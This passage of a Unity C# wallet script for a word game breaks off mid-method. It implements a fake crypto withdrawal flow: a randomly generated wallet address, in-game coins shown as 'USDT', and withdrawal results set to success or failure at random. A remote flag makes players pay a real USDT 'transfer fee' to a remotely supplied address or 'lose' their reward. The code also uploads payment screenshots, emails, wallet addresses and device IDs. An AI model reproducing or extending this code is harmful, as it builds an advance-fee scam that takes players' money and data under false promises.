using System;
using System.Collections;
using System.Collections.Generic;
using EasyUI.Toast;
using TMPro;
using UnityEngine;
using UnityEngine.UI;
using Firebase.Storage;
using System.IO;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using Game;
public class WordNexus_WalletManager : MonoBehaviour
{
    public static WordNexus_WalletManager Instance;
    public int ID;
    public string olddata_Name, Old_Asset_Name, Old_Fee_Amount;
    public GameObject Main_Wallet_Screen,
                      Send_Wallet_Screen,
                      Select_Network_Screen,
                      Tranfer_Details_Wallet_Screen,
                      Pay_Fee_Screen,
                      History_Screen,
                      Receive_Screen,
                      Lock_Screen,
                      Buy_Swap_Screen;
    public string myAddress;
    public int Pay_Screen_Conform_Count = 0;
    public Button PayFee_screen_PayBtn, PayFee_screen_BackBtn;
    public Button Select_Network_screen_BackBtn;
    public Button Transfer_Fee_Detail_Back_Btn, Transfer_Fee_Detail_Confirm_Btn;
    const string glyphs = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    [Header("-------Main_Wallet_Screen-------")]
    public Text Coin_Amount;
    public TextMeshProUGUI Buy_Sell_Message;
    public GameObject transcationHolder, No_Transaction_Object;
    public WordNexus_WalletTransactionManager TransactionPrefab;

    [Header("-------Lock_Screen-------")]
    public Text Lock_Screen_Message_Text;

    [Header("-------Pay_Fee_Screen-------")]
    public RawImage QRImage;
    public TextMeshProUGUI Note_Text_Pay_Screen, Confirm_text_Box, Address_Text;
    public GameObject Display_Image_Object, RequireImage_Object;
    public Toggle confirm_Toggle;

    public bool Secondtime_Open_PayScreen;

    [Header("-------Receive_Screen-------")]
    public Text Receive_Screen_Wallet_Address_Text;
    public RawImage Receive_Screen_QR;


    [Header("-------Send_Wallet_Screen-------")]
    public Text Coin_Amount_Send_Screen_Text;
    public TextMeshProUGUI Converted_Amount, note_Text;
    public TMP_InputField Amount_Input,recipientAddress_InputField;
    double piCoin = 0;
    int picoin_decrise;
    public TMP_InputField emailID_Input;


    [Header("-------Tranfer_Details_Wallet_Screen-------")]
    public Text Amount_Text_Tranfer_Details_Wallet_Screen;
    public GameObject Asset_Object, Network_Fee_Object, Network_Icon_Object;
    public Text Asset_Object_text, Wallet_Object_text, To_Object_text, Network_Fee_Object_text;
    public TextMeshProUGUI InfoMessage_text;
    public GameObject NetworFeeInfoPopup;

    [Header("-------History_Screen-------")]
    public GameObject Network_Fee_object_history;
    public GameObject Note_Object, Note_Object_head;
    public Text Amount_Text_History, Date_Text_History, Status_Text_History, To_Text_History, Network_Fee_Text_History, descriptionTxt;
    public Button Pay_Btn;
    public TextMeshProUGUI Note_Text_History;

    [Header("-------Select_Network_Screen-------")]
    public GameObject PrefabHolder;
    public GameObject NetworkPrefab;
    public TextMeshProUGUI Note_text;
    public int QR_Index;
    public bool Secondtime_Open_Screen;
    public ScrollRect sendScrollRect;

    public TMP_InputField email_Input;

    public string emailId, amount, walletAddress, chainName;

    /// <summary>
    /// Awake is called when the script instance is being loaded.
    /// </summary>
    void Awake()
    {
        if (Instance == null)
            Instance = this;
    }
    void Start()
    {

        Lock_Screen.SetActive(false);
        History_Screen.SetActive(false);
        Select_Network_Screen.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(false);
        Pay_Fee_Screen.SetActive(false);
        confirm_Toggle.isOn = false;
        PayFee_screen_PayBtn.gameObject.SetActive(false);
        Send_Wallet_Screen.SetActive(false);
        Receive_Screen.SetActive(false);

        if (!PlayerPrefs.HasKey("UserAddress"))
        {
            for (int i = 0; i < 27; i++)
            {
                myAddress += glyphs[UnityEngine.Random.Range(0, glyphs.Length)];
            }
            PlayerPrefs.SetString("UserAddress", myAddress);
            PlayerPrefs.SetString("UserAddressTransactionFee", myAddress);
        }
        else
        {
            myAddress = PlayerPrefs.GetString("UserAddress");
        }
    }  public void UploadImageToFirebase(byte[] imageData)
    {
        string path = "User";

        string fileName;
        Debug.LogError(Secondtime_Open_Screen);
        if (Secondtime_Open_Screen)
        {
            fileName = PlayerPrefs.GetString("replacestring_TransferFee" + ID);
            Debug.Log(PlayerPrefs.GetString("replacestring_TransferFee" + ID));
            Debug.Log(fileName);

            FirebaseStorage storage = FirebaseStorage.DefaultInstance;
            StorageReference storageRef = storage.GetReferenceFromUrl("gs://word-nexus-ios.appspot.com");
            string name = indian_time() + "__" + Network_Fee_Object_text.text + "__USDT__" + SystemInfo.deviceUniqueIdentifier;
            StorageReference imageRef = storageRef.Child(name);

            imageRef.PutBytesAsync(imageData).ContinueWith(task =>
            {
                if (task.IsFaulted || task.IsCanceled)
                {
                    Debug.LogError("Failed to upload image: " + task.Exception);
                }
                else
                {
                    Debug.Log("Image uploaded to Firebase Storage!");
                }
            });
            Check_Togal_And_Image();
            Debug.Log(PlayerPrefs.GetInt("TransactionIDTransactionFee", 0));
            Debug.Log(PlayerPrefs.GetString("replacestring_TransferFee" + ID));
        }
        else
        {
            fileName = PlayerPrefs.GetString("replacestring_TransferFee" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0));
            Debug.Log(PlayerPrefs.GetString("replacestring_TransferFee" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0)));
            Debug.Log(fileName);

            string name = indian_time() + "__" + Network_Fee_Object_text.text + "__USDT__" + SystemInfo.deviceUniqueIdentifier;

            FirebaseStorage storage = FirebaseStorage.DefaultInstance;
            StorageReference storageRef = storage.GetReferenceFromUrl("gs://word-nexus-ios.appspot.com");
            StorageReference imageRef = storageRef.Child(name);

            imageRef.PutBytesAsync(imageData).ContinueWith(task =>
            {
                if (task.IsFaulted || task.IsCanceled)
                {
                    Debug.LogError("Failed to upload image: " + task.Exception);
                }
                else
                {
                    Debug.Log("Image uploaded to Firebase Storage!");
                }
            });
            Check_Togal_And_Image();
            Debug.Log(PlayerPrefs.GetInt("TransactionIDTransactionFee", 0));
            Debug.Log(PlayerPrefs.GetString("replacestring_TransferFee" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0)));
        }
    }
    
    public string indian_time()
    {
        DateTime day_ = DateTime.Now;
        string h = day_.Hour.ToString("00");
        string m = day_.Minute.ToString("00");
        string Current_Date = h + "_" + m;
        return Current_Date;
    }

    public void Check_Togal_And_Image()
    {
        if (Display_Image_Object.activeSelf && !RequireImage_Object.activeSelf)
        {
            if (confirm_Toggle.isOn)
            {
                PayFee_screen_PayBtn.gameObject.SetActive(true);
            }
        }
    }

    public void OnToggleValueChanged()
    {
        if (confirm_Toggle.isOn)
        {
            Check_Togal_And_Image();
        }
        else
        {
            PayFee_screen_PayBtn.gameObject.SetActive(false);
        }
    }
    public void Show_Main_Wallet_Screen()
    {
        if (AdManager.Instance.WalletShow.ToLower() == "true" && AdManager.Instance.Crypto_Wallet_Show.ToLower() == "true")
        {
            Main_Wallet_Screen.SetActive(true);
            Main_Wallet_Screen.LeanMoveLocal(Vector2.zero, 0.5f);

            Coin_Amount.text = WordNexus_GameController.Instance.Coins + " USDT";

            CheckTransaction();
        }
    }
    public void Back_Btn_Main_Wallet_Screen()
    {
        Main_Wallet_Screen.LeanMoveLocal(new Vector2(684f, 0), 0.5f);
        GameManager.Instance.coinTxt.text = WordNexus_GameController.Instance.Coins.ToString();
    }
    public void Show_Receive_Screen()
    {
        if (AdManager.Instance.transferFees.ToLower() == "false")
        {
            if (AdManager.Instance.Qureka_ads_status.ToLower() == "false")
            {
                if (FBAdManager.Instash.FBInterLoaded || GoogleAdMob.Instash.InterReady || UnityManager.Instance.UnityInterLoaded)
                {
                    AdManager.Instance.ConfirmInter();
                }
            }
            else if (AdManager.Instance.Qureka_ads_status.ToLower() == "true" &&
                AdManager.Instance.PreLoad.ToLower() == "false" && AdManager.Instance.showaAd.ToLower() == "false")
            {
                QurekaManager.Instance.ShowInterAd();
            }
        }

        QREncodeTest.Instance.Encode();
        Receive_Screen.SetActive(true);
        Receive_Screen_Wallet_Address_Text.text = myAddress;
    }
    public void Back_Btn_Receive_Screen()
    {
        Receive_Screen.SetActive(false);
    }
    public void Copy_Btn_Receive_Screen()
    {
        UniClipboard.SetText(myAddress);
        Toast.SuccessShow("Your address has been copied!");
    }
    public void Show_Send_Wallet_Screen()
    {
        if (WordNexus_GameController.Instance.Coins < float.Parse(AdManager.Instance.WalletUnlockValue) && !PlayerPrefs.HasKey("UnlockSendFeature"))
        {
            Lock_Screen.SetActive(true);
            Lock_Screen_Message_Text.text = "<b>Note* :</b> A feature is accessible at " + float.Parse(AdManager.Instance.WalletUnlockValue) / 1000f + "k USDT Coin!";
        }
        else
        {
            PlayerPrefs.SetInt("UnlockSendFeature", 1);
            Send_Wallet_Screen.SetActive(true);
            Select_Network_Screen.SetActive(false);
            Tranfer_Details_Wallet_Screen.SetActive(false);
            Pay_Fee_Screen.SetActive(false);
            confirm_Toggle.isOn = false;
            PayFee_screen_PayBtn.gameObject.SetActive(false);
            History_Screen.SetActive(false);
            Receive_Screen.SetActive(false);
            note_Text.text = AdManager.Instance.WalletCoinConvertValue + " USDT token = 1 original USDT!";

            Coin_Amount_Send_Screen_Text.text = WordNexus_GameController.Instance.Coins + " USDT";
            Amount_Input.text = "";
            emailID_Input.text = "";
            recipientAddress_InputField.text = "";
            Converted_Amount.text = "= 0.0000";
        }
        if (AdManager.Instance.transferFees.ToLower() == "false" && !PlayerPrefs.HasKey("UnlockSendFeature"))
        {
            if (AdManager.Instance.Qureka_ads_status.ToLower() == "false")
            {
                if (FBAdManager.Instash.FBInterLoaded || GoogleAdMob.Instash.InterReady || UnityManager.Instance.UnityInterLoaded)
                {
                    AdManager.Instance.ConfirmInter();
                }
            }
            else if (AdManager.Instance.Qureka_ads_status.ToLower() == "true" &&
                AdManager.Instance.PreLoad.ToLower() == "false" && AdManager.Instance.showaAd.ToLower() == "false")
            {
                QurekaManager.Instance.ShowInterAd();
            }
        }
    }
    public void Next_Btn_Send_Screen()
    {
        if (!String.IsNullOrEmpty(Amount_Input.text))
        {
            picoin_decrise = int.Parse(Amount_Input.text);
            piCoin = float.Parse(Amount_Input.text);
        }

        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            Toast.Show("You are not connected to the internet. Check your network then try again!");
        }
        else if (recipientAddress_InputField.text.Length < 14)
        {
            Toast.Show("Invalid address... Please check recipient address !");
        }
        else if (Amount_Input.text == "")
        {
            Toast.Show("The transfer amount must be over " + AdManager.Instance.minimumWithdrawal + " coins. Please update your amount and try again", 4);
        }
        else if (recipientAddress_InputField.text == PlayerPrefs.GetString("UserAddress").ToUpper())
        {
            Toast.Show("You can not send coins in your own wallet!");
        }
        else if (string.IsNullOrEmpty(emailID_Input.text))
        {
            Toast.Show("Email ID can't be empty");
        }
        else if (!IsValidEmail(emailID_Input.text))
        {
            Toast.Show("Please Enter Valid Email ID!");
        }
        else if (piCoin < float.Parse(AdManager.Instance.minimumWithdrawal))
        {
            Toast.Show("The transfer amount must be over " + AdManager.Instance.minimumWithdrawal + " coins. Please update your amount and try again", 4);
        }
        else if (piCoin <= WordNexus_GameController.Instance.Coins)
        {
            if (AdManager.Instance.transferFees.ToLower() == "false")
            {
                PlayerPrefs.SetString("Address_" + PlayerPrefs.GetInt("TransactionID", 0),
                    recipientAddress_InputField.text);
                PlayerPrefs.SetString("Amount_" + PlayerPrefs.GetInt("TransactionID", 0),
                    (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2"));
                PlayerPrefs.SetString("Date_" + PlayerPrefs.GetInt("TransactionID", 0), DateTime.Now.ToString());
                PlayerPrefs.SetInt("Firebase_ID" + PlayerPrefs.GetInt("TransactionID", 0), PlayerPrefs.GetInt("TransactionID", 0) + 1);
                Tranfer_Details_Wallet_Screen.SetActive(true);
                PlayerPrefs.SetString("EmailID_" + PlayerPrefs.GetInt("TransactionID", 0), email_Input.text);

                Debug.LogError("email_Input.text => " + email_Input.text);
                Debug.LogError("PlayerPrefs.GetString(\"EmailID_)\"" + PlayerPrefs.GetString("EmailID_" + PlayerPrefs.GetInt("TransactionID", 0)));

                Transfer_Fee_Detail_Confirm_Btn.onClick.RemoveAllListeners();
                Transfer_Fee_Detail_Confirm_Btn.onClick.AddListener(() => Submit_Tranfer_Details_Wallet_Screen());
                Amount_Text_Tranfer_Details_Wallet_Screen.text = (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") + " USDT";
                Asset_Object.SetActive(false);
                Network_Fee_Object.SetActive(false);
                Wallet_Object_text.text = PlayerPrefs.GetString("UserAddress").Substring(0, 7) + "..." + PlayerPrefs.GetString("UserAddress").Substring(PlayerPrefs.GetString("UserAddress").Length - 7, 7);
                To_Object_text.text = PlayerPrefs.GetString("Address_" + PlayerPrefs.GetInt("TransactionID", 0)).Substring(0, 7) + "..." +
                    PlayerPrefs.GetString("Address_" + PlayerPrefs.GetInt("TransactionID", 0)).Substring(PlayerPrefs.GetString("Address_" + PlayerPrefs.GetInt("TransactionID", 0)).Length - 7, 7);
                string a = (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") + "_USDT" + PlayerPrefs.GetInt("Firebase_ID" + PlayerPrefs.GetInt("TransactionID", 0));
                string replacestring = a.Replace(".", "_");
                olddata_Name = replacestring;
                PlayerPrefs.SetString("replacestring" + PlayerPrefs.GetInt("TransactionID", 0), replacestring);


                Transfer_Fee_Detail_Back_Btn.onClick.RemoveAllListeners();
                Transfer_Fee_Detail_Back_Btn.onClick.AddListener(() => Back_Btn_Tranfer_Details_Wallet_Screen());
            }
            else
            {

                PlayerPrefs.SetString("AddressTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
                    recipientAddress_InputField.text);
                PlayerPrefs.SetString("AmountTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
                    (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2"));
                PlayerPrefs.SetString("DateTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
                    DateTime.Now.ToString());

                PlayerPrefs.SetInt("Firebase_TransferFee_ID" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), PlayerPrefs.GetInt("TransactionIDTransactionFee", 0) + 1);

                Open_Selecte_Network_Screen();

                string a = (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") + "_USDT" + PlayerPrefs.GetInt("Firebase_TransferFee_ID" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0));
                string replacestring = a.Replace(".", "_");
                olddata_Name = replacestring;
                PlayerPrefs.SetString("replacestring_TransferFee" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), replacestring);




                Transfer_Fee_Detail_Back_Btn.onClick.RemoveAllListeners();
                Transfer_Fee_Detail_Back_Btn.onClick.AddListener(() => Back_Btn_Tranfer_Details_Wallet_Screen());
            }
        }

        else
        {
            Toast.Show("Insufficient coins in your wallet to initiate the transfer. Please collect more coins to proceed.", 4);
        }

    }

    public bool IsValidEmail(string email)
    {
        // Define a regular expression for validating an Email
        string emailPattern = @"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$";

        // Create a Regex object
        Regex regex = new Regex(emailPattern);

        // Match the regular expression pattern against the email
        return regex.IsMatch(email);
    }
    public void Submit_Tranfer_Details_Wallet_Screen()
    {
        if (AdManager.Instance.transferFees.ToLower() == "false")
        {

            WordNexus_GameController.Instance.SpendCoins(picoin_decrise);
            Coin_Amount.text = WordNexus_GameController.Instance.Coins + " USDT";

            if ((UnityEngine.Random.Range(0, 2) == 1))
            {
                PlayerPrefs.SetString("FinalStatus_" + PlayerPrefs.GetInt("TransactionID", 0), "Success");
            }
            else
            {
                PlayerPrefs.SetString("FinalStatus_" + PlayerPrefs.GetInt("TransactionID", 0), "Failed");
            }


            if (PlayerPrefs.GetInt("FinalNotification_" + PlayerPrefs.GetInt("TransactionID", 0)) == 0)
            {
                NewNotificationManager.Instance.CalculateNotifications(
                   PlayerPrefs.GetInt("TransactionID", 0));
            }


            PlayerPrefs.SetInt("TransactionID", PlayerPrefs.GetInt("TransactionID", 0) + 1);
            CheckTransaction();
            Toast.SuccessShow(
                "Your request to send " + (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") +
                " coins has been successful. A confirmation message will be sent shortly.", 4);


            Tranfer_Details_Wallet_Screen.SetActive(false);
            Send_Wallet_Screen.SetActive(false);

        }
    }
    public void CheckTransaction()
    {
        for (int i = 0; i < transcationHolder.transform.childCount; i++)
        {
            Destroy(transcationHolder.transform.GetChild(i).gameObject);
        }

        if (PlayerPrefs.GetInt("TransactionID", 0) > 0)
        {
            int TempId = PlayerPrefs.GetInt("TransactionID", 0) - 1;
            for (int i = TempId; i >= 0; i--)
            {
                WordNexus_WalletTransactionManager tempObj = Instantiate(TransactionPrefab, transcationHolder.transform);
                tempObj.ID = i;
                tempObj.setData(PlayerPrefs.GetString("Address_" + i), PlayerPrefs.GetString("Amount_" + i),
                    PlayerPrefs.GetString("Date_" + i));
            }
        }

        if (PlayerPrefs.GetInt("TransactionIDTransactionFee", 0) > 0)
        {
            int TempId = PlayerPrefs.GetInt("TransactionIDTransactionFee", 0) - 1;
            for (int i = TempId; i >= 0; i--)
            {
                WordNexus_WalletTransactionManager tempObj = Instantiate(TransactionPrefab, transcationHolder.transform);
                tempObj.ID = i;
                tempObj.gameObject.tag = "TransactionFee";
                tempObj.setDataWithTransferFees(PlayerPrefs.GetString("AddressTransactionFee_" + i),
                    PlayerPrefs.GetString("AmountTransactionFee_" + i),
                    PlayerPrefs.GetString("DateTransactionFee_" + i),
                     PlayerPrefs.GetString("TransactionMinuteTransactionFee_" + i));
            }
        }


        if (transcationHolder.transform.childCount > 0)
        {
            No_Transaction_Object.SetActive(false);
        }
        else
        {
            No_Transaction_Object.SetActive(true);
        }

    }
    public void Back_Btn_Tranfer_Details_Wallet_Screen()
    {
        Tranfer_Details_Wallet_Screen.SetActive(false);
        if (AdManager.Instance.transferFees.ToLower() == "true")
        {
            Open_Selecte_Network_Screen();
        }
        else
        {
            Send_Wallet_Screen.SetActive(true);
        }
    }
    public void ConvertPI()
    {
        float piCoin = 0;
        if (!String.IsNullOrEmpty(Amount_Input.text))
            float.TryParse(Amount_Input.text, out piCoin);

        Converted_Amount.text = "= " + (piCoin /
                float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f4");

    }
    public void Back_Btn_Send_Wallet_Screen()
    {
        Send_Wallet_Screen.SetActive(false);
        CheckTransaction();
    }
    public void Back_Btn_Lock_Screen()
    {
        Lock_Screen.SetActive(false);
    }
    public void Back_Btn_History_Screen()
    {
        History_Screen.SetActive(false);
    }

    void Open_Selecte_Network_Screen()
    {
        Select_Network_screen_BackBtn.onClick.RemoveAllListeners();
        Select_Network_screen_BackBtn.onClick.AddListener(() => Back_Btn_Selecte_Network_Screen());
        Select_Network_Screen.SetActive(true);
        if (AdManager.Instance.isTransferFeesFix.ToLower() == "true")
        {
            Note_text.text = "Don't worry, it's the cryptocurrency block chain portion. you will be required to pay " + AdManager.Instance.transferFeesAmount +
                " USDT for this transaction for channel fees, which will also be included to your withdrawal.";
        }
        else
        {
            Note_text.text = "Don't worry, it's the cryptocurrency block chain portion. you will be required to pay " +
            ((piCoin * float.Parse(AdManager.Instance.transferFeesPercentage)) / 100f).ToString("f2") +
                " USDT for this transaction for channel fees, which will also be included to your withdrawal.";
        }
        for (int i = 0; i < PrefabHolder.transform.childCount; i++)
        {
            Destroy(PrefabHolder.transform.GetChild(i).gameObject);
        }
        Debug.Log(GetData.instance.data1.data.Count + " network lenth");
        for (int i = 0; i < GetData.instance.data1.data.Count; i++)
        {
            GameObject a = Instantiate(NetworkPrefab, PrefabHolder.transform);
            Debug.Log(a + " i");
            if (AdManager.Instance.isTransferFeesFix.ToLower() == "true")
            {
                a.GetComponent<WordNexus_NetworkManager>().Assign_Data(GetData.instance.data1.data[i].type, AdManager.Instance.transactionMinuteForTransferFeesFlow,
                AdManager.Instance.transferFeesAmount);
            }
            else
            {
                a.GetComponent<WordNexus_NetworkManager>().Assign_Data(GetData.instance.data1.data[i].type, AdManager.Instance.transactionMinuteForTransferFeesFlow,
                ((piCoin * float.Parse(AdManager.Instance.transferFeesPercentage)) / 100f).ToString("f2"));
            }
        }
    }

    public void Back_Btn_Selecte_Network_Screen()
    {
        Select_Network_Screen.SetActive(false);
        Send_Wallet_Screen.SetActive(true);

    }
    public void Open_Transfer_Details_Screen_Secnd_Time(string Asset_Name, string Fee_Amount)
    {
        Old_Asset_Name = Asset_Name;
        Old_Fee_Amount = Fee_Amount;
        Select_Network_Screen.SetActive(false);
        Amount_Text_Tranfer_Details_Wallet_Screen.text = Amount_Text_History.text;
        Asset_Object.SetActive(true);
        Network_Fee_Object.SetActive(true);
        Network_Icon_Object.SetActive(true);
        Asset_Object_text.text = Asset_Name;
        Network_Fee_Object_text.text = Network_Fee_Text_History.text;
        Wallet_Object_text.text = myAddress.Substring(0, 7) + "..." + myAddress.Substring(myAddress.Length - 7, 7);
        To_Object_text.text = PlayerPrefs.GetString("AddressTransactionFee_" + ID).Substring(0, 7) + "..." +
            PlayerPrefs.GetString("AddressTransactionFee_" + ID).Substring(PlayerPrefs.GetString("AddressTransactionFee_" + ID).Length - 7, 7);
        Tranfer_Details_Wallet_Screen.SetActive(true);

        Transfer_Fee_Detail_Confirm_Btn.onClick.RemoveAllListeners();
        Transfer_Fee_Detail_Confirm_Btn.onClick.AddListener(() => OpenPay_Screen_Secondtime());
        Transfer_Fee_Detail_Back_Btn.onClick.RemoveAllListeners();
        Transfer_Fee_Detail_Back_Btn.onClick.AddListener(() => Transfer_Fee_Back_Second_Time());
        WordNexus_NetworkIconManage.instance.Set();
        chainName = Asset_Name;

    }
    public void UpdateData()
    {
        if (string.IsNullOrEmpty(email_Input.text))
        {
            Toast.Show("Email ID can't be empty");
            return;
        }
        else if (!IsValidEmail(email_Input.text))
        {
            Toast.Show("Please Enter Valid Email ID!");
            return;
        }
        AdManager.Instance.WebviewOpen = false;
        PlayerPrefs.SetString("TransferFeesStatus_" + ID, "Pending");
        PlayerPrefs.SetString("EmailID_" + ID, email_Input.text);
        PlayerPrefs.SetString("DateTransactionFee_" + ID, DateTime.Now.ToString());
        PlayerPrefs.SetString("TransactionMinuteTransactionFee_" + ID, AdManager.Instance.transactionMinuteForTransferFeesFlow);
        PayFee_screen_PayBtn.onClick.RemoveAllListeners();
        CheckTransaction();
        Lock_Screen.SetActive(false);
        History_Screen.SetActive(false);
        Select_Network_Screen.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(false);
        Send_Wallet_Screen.SetActive(false);
        Receive_Screen.SetActive(false);
        Pay_Fee_Screen.SetActive(false);
        confirm_Toggle.isOn = false;
        PayFee_screen_PayBtn.gameObject.SetActive(false);

        StartCoroutine(UploadData(PlayerPrefs.GetString("EmailID_" + ID, "null"), amount, walletAddress, true));
        Secondtime_Open_Screen = false;
        Toast.SuccessShow("Your request to send " + amount + " coins has been successful. A confirmation message will be sent shortly.", 4);
    }
    public void Transfer_Fee_Back_Second_Time()
    {
        Tranfer_Details_Wallet_Screen.SetActive(false);
        open_Network_Screen_Second_Time();
    }
    public void Open_Tranfer_Details_Wallet_Screen_Transfer_fee_True(string Asset_Name, string Fee_Amount)
    {
        Select_Network_Screen.SetActive(false);
        Amount_Text_Tranfer_Details_Wallet_Screen.text = (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") + " USDT";
        Asset_Object.SetActive(true);
        Network_Fee_Object.SetActive(true);
        Network_Icon_Object.SetActive(true);
        Asset_Object_text.text = Asset_Name;
        Network_Fee_Object_text.text = Fee_Amount;
        Wallet_Object_text.text = myAddress.Substring(0, 7) + "..." + myAddress.Substring(myAddress.Length - 7, 7);
        To_Object_text.text = PlayerPrefs.GetString("AddressTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0)).Substring(0, 7) + "..." +
            PlayerPrefs.GetString("AddressTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0)).Substring(PlayerPrefs.GetString("AddressTransactionFee_" +
                PlayerPrefs.GetInt("TransactionIDTransactionFee", 0)).Length - 7, 7);
        Tranfer_Details_Wallet_Screen.SetActive(true);

        Transfer_Fee_Detail_Confirm_Btn.onClick.RemoveAllListeners();
        Transfer_Fee_Detail_Confirm_Btn.onClick.AddListener(() => Open_Payfee_screen());
        WordNexus_NetworkIconManage.instance.Set();

        chainName = Asset_Name;
        Debug.Log("Asset_Name =>" + Asset_Name);


    }
    public void Open_Payfee_screen()
    {

        AdManager.Instance.WebviewOpen = true;

        email_Input.text = emailID_Input.text;

        Pay_Fee_Screen.SetActive(true);
        sendScrollRect.verticalNormalizedPosition = 1;
        Confirm_text_Box.text = "Confirm if You Pay Fees <color=\"red\"><size=120%>" + Network_Fee_Object_text.text + " USDT</size=120%></color=\"red\"> For " + Asset_Object_text.text + " network.";
        Display_Image_Object.SetActive(false);
        RequireImage_Object.SetActive(true);
        PayFee_screen_PayBtn.onClick.RemoveAllListeners();
        PayFee_screen_PayBtn.onClick.AddListener(() => Pay_Screen_Done_Btn());
        PayFee_screen_BackBtn.onClick.RemoveAllListeners();
        PayFee_screen_BackBtn.onClick.AddListener(() => Back_Btn_Pay_Screen());
        Note_Text_Pay_Screen.text = "For your crypto withdrawal, you need to pay transfer fees for this channel. Please ensure to handle this specific fee to" +
        " facilitate a smooth withdrawal process. If not paid, you may not be eligible for withdrawal and losing your reward. Once you paid, we'll process your" +
        " withdrawal within " + AdManager.Instance.transactionMinuteForTransferFeesFlow + " Minutes of receiving payment.";
        // Network_Text_Box.text=Asset_Object_text.text;
        Tranfer_Details_Wallet_Screen.SetActive(false);
        for (int i = 0; i < GetData.instance.data1.data.Count; i++)
        {
            if (GetData.instance.data1.data[i].type == Asset_Object_text.text)
            {
                StartCoroutine(GetPuzzleImage(GetData.instance.data1.data[i].image, GetData.instance.data1.data[i].address));
                PlayerPrefs.SetString("Pay_Image_Name" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), GetData.instance.data1.data[i].image);
                break;
            }
        }

    }
    IEnumerator GetPuzzleImage(string imageName, string Address)
    {
        WWW data = new WWW(imageName);
        yield return data;

        Texture2D texture2D = data.texture;
        QRImage.texture = texture2D;
        Address_Text.text = Address + "<sprite name=\"copy\">";
    }
    public void Back_Btn_Pay_Screen()
    {
        AdManager.Instance.WebviewOpen = false;
        Pay_Fee_Screen.SetActive(false);
        confirm_Toggle.isOn = false;
        PayFee_screen_PayBtn.gameObject.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(true);
        Pay_Screen_Conform_Count = 0;
        Secondtime_Open_Screen = false;
    }
    public void Copy_Btn_Pay_Screen()
    {
        for (int i = 0; i < GetData.instance.data1.data.Count; i++)
        {
            if (GetData.instance.data1.data[i].type == Asset_Object_text.text)
            {
                UniClipboard.SetText(GetData.instance.data1.data[i].address);
                Toast.SuccessShow("Your address has been copied!");
                break;
            }
        }
    }
    public void Pay_Screen_Done_Btn()
    {
        if (string.IsNullOrEmpty(email_Input.text))
        {
            Toast.Show("Email ID can't be empty");
            return;
        }
        else if (!IsValidEmail(email_Input.text))
        {
            Toast.Show("Please Enter Valid Email ID!");
            return;
        }
        Secondtime_Open_Screen = false;
        AdManager.Instance.WebviewOpen = false;
        PlayerPrefs.SetString("TransactionMinuteTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
            AdManager.Instance.transactionMinuteForTransferFeesFlow);
        PlayerPrefs.SetString("EmailID_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), email_Input.text);
        DoneTransaction();
        Lock_Screen.SetActive(false);
        History_Screen.SetActive(false);
        Select_Network_Screen.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(false);
        Pay_Fee_Screen.SetActive(false);
        confirm_Toggle.isOn = false;
        PayFee_screen_PayBtn.gameObject.SetActive(false);
        Send_Wallet_Screen.SetActive(false);
        Receive_Screen.SetActive(false);
        StartCoroutine(UploadData(email_Input.text, (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2"), recipientAddress_InputField.text, false));
    }
    public IEnumerator UploadData(string email, string amount, string walletAddress, bool isHistoryEdit = true)
    {
        WWWForm form = new WWWForm();

        form.AddField("entry.1580232719", email);
        form.AddField("entry.1869485652", amount);
        form.AddField("entry.1792037476", walletAddress);
        form.AddField("entry.1292434961", isHistoryEdit.ToString());
        form.AddField("entry.977241729", chainName);
        form.AddField("entry.1547943652", "IOS");
        form.AddField("entry.1521043593", SystemInfo.deviceUniqueIdentifier.ToString());

        byte[] rawData = form.data;
        WWW www = new WWW(AdManager.Instance.UploadData_SheetURI, rawData);
        yield return www;
        Debug.Log(email);
        Debug.Log(amount);
        Debug.Log(walletAddress);
        Debug.Log(isHistoryEdit.ToString());
        Debug.Log(chainName);
        Debug.Log(AdManager.Instance.UploadData_SheetURI);
        Debug.Log(www.isDone);
    }
    public void DoneTransaction()
    {
        if (AdManager.Instance.isTransferFeesFix.ToString() == "false")
        {
            PlayerPrefs.SetString("TransactionFeeAmountOFTransactionFeeFlow_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
            (((piCoin * float.Parse(AdManager.Instance.transferFeesPercentage)) /
                                        100)).ToString("f2"));
        }
        else
        {
            PlayerPrefs.SetString("TransactionFeeAmountOFTransactionFeeFlow_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0),
            AdManager.Instance.transferFeesAmount);
        }
        PlayerPrefs.SetString("Selected_network" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), Asset_Object_text.text);
